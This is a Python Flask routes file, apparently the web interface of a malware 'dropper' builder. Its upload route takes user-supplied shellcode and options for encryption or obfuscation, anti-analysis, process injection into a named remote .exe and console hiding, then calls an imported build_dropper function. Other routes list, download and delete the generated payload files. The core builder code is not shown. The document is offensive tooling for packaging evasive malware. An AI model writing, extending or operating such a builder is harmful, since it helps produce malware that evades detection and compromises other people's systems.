import os
import tempfile
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, jsonify

from dropper_builder import fetch_available_modules, build_dropper


def init_routes(app):
    @app.route("/")
    def index():
        # Get the list of files in the upload folder
        files = os.listdir(app.config['OUTPUT_FOLDER'])
        # Get file details
        file_details = []
        for file in files:
            file_path = os.path.join(app.config['OUTPUT_FOLDER'], file)
            file_size = os.path.getsize(file_path)
            file_modified_time = os.path.getmtime(file_path)
            file_modified_time_str = datetime.fromtimestamp(file_modified_time).strftime('%Y-%m-%d %H:%M:%S')
            file_details.append({
                'name': file,
                'size': file_size,
                'modified_time': file_modified_time_str
            })
        return render_template('index.html', files=file_details)

    @app.route("/config", methods=["GET"])
    def config():
        modules = fetch_available_modules()
        return render_template("dropper_config.html", modules=modules)

    
    @app.route('/download/<filename>')
    def download_file(filename):
        return send_from_directory(app.config['OUTPUT_FOLDER'], filename, as_attachment=True)

    @app.route('/delete/<filename>', methods=['DELETE'])
    def delete_file(filename):
        file_path = os.path.join(app.config['OUTPUT_FOLDER'], filename)
        
        if os.path.exists(file_path):
            os.remove(file_path)
            return jsonify({"message": f"'{filename}' has been deleted."}), 200
        else:
            return jsonify({"error": f"'{filename}' not found."}), 404
    
    @app.route('/upload', methods=['POST'])
    def upload_file():
        # Initialize a dictionary to store form data
        form_data = {}

        # Add all form inputs to form_data
        for key, value in request.form.items():
            form_data[key] = value

        # Handle checkbox inputs
        form_data['encryption_or_obfuscation'] = (form_data.get('encryption') or form_data.get('obfuscation') or "").lower()
        form_data['anti_analysis'] = form_data.get('anti_analysis') is not None
        form_data['debug_enabled'] = form_data.get('debug') is not None
        form_data['hide_console'] = form_data.get('hide_console') is not None

        # Handle file upload
        if 'shellcode' in request.files:
            file = request.files['shellcode']
            if file.filename != '':
                with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                    temp_file.write(file.read())  # Write file content to temp file
                    form_data['shellcode_path'] = temp_file.name
            else:
                form_data['shellcode_path'] = None
        else:
            form_data['shellcode_text'] = form_data.get('shellcode_text')

        # Handle filename and file extension
        form_data['out_filename'] = f"{form_data.get('filename')}{form_data.get('file_extension')}"

        # Process the inputs as needed
        print(f"Encryption/Obfuscation: {form_data['encryption_or_obfuscation']}")
        print(f"Anti Analysis: {form_data['anti_analysis']}")
        print(f"Injection Method: {form_data.get('injection')}")
        print(f"Target Remote Process: {form_data.get('process_name', "None")}.exe")
        if form_data.get('shellcode_path'):
            print(f"Shellcode Path: {form_data['shellcode_path']}")
        else:
            print(f"Shellcode Text: {form_data.get('shellcode_text')}")
        print(f"Output Filename: {form_data['out_filename']}")
        print(f"Debug Enabled: {form_data['debug_enabled']}")

        # Call build_dropper with the form data
        build_dropper(
            debug_enabled=form_data['debug_enabled'],
            out_filename=form_data['out_filename'],
            shellcode_path=form_data.get('shellcode_path'),
            out_file_extension=form_data['file_extension'],
            encryption_or_obfuscation=form_data['encryption_or_obfuscation'],
            anti_analysis=form_data['anti_analysis'],
            injection_method=form_data.get('injection'),
            process_name=f"{form_data.get("process_name", "")}.exe" if form_data.get("process_name") else None,
            hide_console=form_data['hide_console'],
        )

        return redirect(url_for('index'))
